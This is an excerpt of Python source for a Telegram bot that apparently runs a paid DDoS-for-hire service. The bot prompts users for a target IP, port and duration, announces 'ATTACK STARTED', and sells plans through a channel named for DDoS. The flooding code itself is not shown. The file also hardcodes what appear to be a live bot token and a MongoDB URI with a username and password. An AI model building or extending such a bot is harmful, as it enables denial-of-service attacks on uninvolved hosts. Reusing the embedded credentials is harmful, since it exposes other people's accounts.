...
TOKEN = '7165980520:AAHmRc043QOvcKBiUhtxxy03yfj8Q8wzjoA'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002228580585
CHANNEL_ID = -1002228580585
error_channel_id = -1002228580585
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*𝐔𝐑 𝐍𝐎𝐓 𝐀𝐏𝐏𝐎𝐑𝐕𝐄𝐃 😂 𝐃𝐦 @TFN_NOOB_XD*", parse_mode='Markdown')
...
def attack_command(message):
    ...
    try:
        bot.send_message(chat_id, "*𝗘nter IP PORT TIME (separated by space) @TFN_NOOB_XD 🚀 .*", parse_mode='Markdown')
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*ATTACK STARTED ⚡️\n\n🎯ℍ𝕆𝕊𝕋: {target_ip}\n🔦ℙ𝕆ℝ𝕋: {target_port}\n🕙𝕋𝕀𝕄𝔼: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/infinityxddos/17750*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*𝐏𝐚𝐲 𝐚𝐧𝐝 𝐭𝐚𝐤𝐞 𝐚𝐜𝐜𝐞𝐬𝐬👽*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*𝐁𝐨𝐭 𝐟𝐚𝐭𝐡𝐞𝐫 @TFN_NOOB_XD 🗿*", parse_mode='Markdown')
    else:
